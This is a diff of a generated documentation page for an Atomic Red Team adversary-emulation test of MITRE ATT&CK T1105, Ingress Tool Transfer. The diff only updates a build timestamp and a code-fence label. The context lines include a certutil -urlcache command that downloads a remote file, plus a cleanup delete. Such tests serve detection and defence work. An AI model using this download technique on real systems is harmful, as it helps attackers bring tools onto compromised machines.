@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1105"
 attack_technique_name: "Ingress Tool Transfer"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "dd3b61dd-7bbc-48cd-ab51-49ad1a776df0"
@@ -56,13 +56,13 @@ Use certutil -urlcache argument to download a file from the web. Note - /urlcach
 
 ### Command
 
-```commandprompt
+```cmd
 cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del #{local_path} >nul 2>&1
 ```
 
